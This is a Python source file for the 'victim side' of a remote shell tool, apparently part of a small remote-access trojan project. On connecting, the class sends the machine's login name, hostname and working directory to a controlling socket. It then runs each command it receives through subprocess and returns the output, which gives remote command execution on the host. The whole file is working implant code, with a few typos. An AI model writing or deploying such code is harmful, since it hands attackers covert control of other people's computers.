import os
import subprocess
import threading
from glob import glob

from src.modlues.protocols.general import GeneralPacket, GeneralPacketType
from src.modlues.protocols.protocol import HandelPacket, Packet, SendPacket, PacketType, PacketConstants
from src.modlues.protocols.remote_shell import RemoteShellPacket, RemoteShellPacketType


class RemoteShellVictimSide:

    def __init__(self, sock):
        self.sock = sock
        self.is_connected = False
        self.last_cwd = ''

    def main(self):
        self.__connect()

        while self.is_connected:
            try:
                packet = HandelPacket.recv_packet(self.sock)
                self.handle(packet)
            except Exception as e:
                print(e)
                self.is_connected = False
        else:
            pass

    def handle(self, packet: Packet):

        if packet.packet_type == PacketType.REMOTE_SHELL.value:
            if packet.packet_sub_type == RemoteShellPacketType.COMMAND.value:
                print(packet.payload.decode())
                threading.Thread(target=self.__execute_and_capture(packet.payload.decode())).start()

    def __connect(self):
        packet_payload = f'{os.getlogin()}@{os.uname()[1]} {self.__get_cwd()}'.encode()
        packet = GeneralPacket(GeneralPacketType.ACK, payload=packet_payload)
        SendPacket.send_packet(self.sock, packet)

        self.is_connected = True

    def __disconnect(self):
        packet = RemoteShellPacket(RemoteShellPacketType.EXIT, "Disconnecting...".encode())
        SendPacket.send_packet(self.sock, packet)
        self.is_connected = False

    def __execute_and_capture(self, command: str):

        command = command.split(' ')

        if command[0] == 'cd':
            os.chdir(command[1])

        if command[0] == "exitrsh":
            self.__disconnect()

        try:
            result = subprocess.run(command, capture_output=True)
        except Exception as e:
            print("exceptoin")
            self.__send_output((str(e) + '\n').encode())
        else:
            self.__send_output(result.stdout + result.stderr)

        cwd = os.getcwd()
        if self.last_cwd != cwd:
            self.__senc_cwd(cwd)
            self.last_cwd = cwd

    def __get_cwd(self):
        return os.getcwd()

    def __send_output(self, output: bytes):
        packet = RemoteShellPacket(RemoteShellPacketType.OUTPUT, output)
        SendPacket.send_packet(self.sock, packet)

    def __senc_cwd(self, cwd):
        packet = RemoteShellPacket(RemoteShellPacketType.CWD, cwd.encode())
        SendPacket.send_packet(self.sock, packet)
